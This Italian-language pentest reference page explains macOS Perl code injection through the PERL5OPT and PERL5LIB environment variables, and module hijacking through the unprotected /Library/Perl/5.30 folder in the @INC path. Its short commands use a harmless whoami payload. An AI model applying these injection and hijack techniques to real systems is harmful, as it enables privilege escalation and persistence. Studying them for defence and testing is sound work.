# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Tramite la variabile d'ambiente `PERL5OPT` & `PERL5LIB`

Utilizzando la variabile d'ambiente PERL5OPT è possibile far eseguire a perl comandi arbitrari.\
Ad esempio, crea questo script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Ora **esporta la variabile di ambiente** ed esegui lo **script perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Un'altra opzione è creare un modulo Perl (ad es. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
E poi usa le variabili di ambiente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dipendenze

È possibile elencare l'ordine della cartella delle dipendenze di Perl in esecuzione:
```bash
perl -e 'print join("\n", @INC)'
```
Che restituirà qualcosa come:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Alcune delle cartelle restituite non esistono nemmeno, tuttavia, **`/Library/Perl/5.30`** **esiste**, **non è** **protetta** da **SIP** ed è **prima** delle cartelle **protette da SIP**. Pertanto, qualcuno potrebbe abusare di quella cartella per aggiungere dipendenze di script in modo che uno script Perl ad alta privilegio lo carichi.

> [!WARNING]
> Tuttavia, nota che **devi essere root per scrivere in quella cartella** e oggigiorno riceverai questo **prompt TCC**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Ad esempio, se uno script importa **`use File::Basename;`**, sarebbe possibile creare `/Library/Perl/5.30/File/Basename.pm` per far eseguire codice arbitrario.

## Riferimenti

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
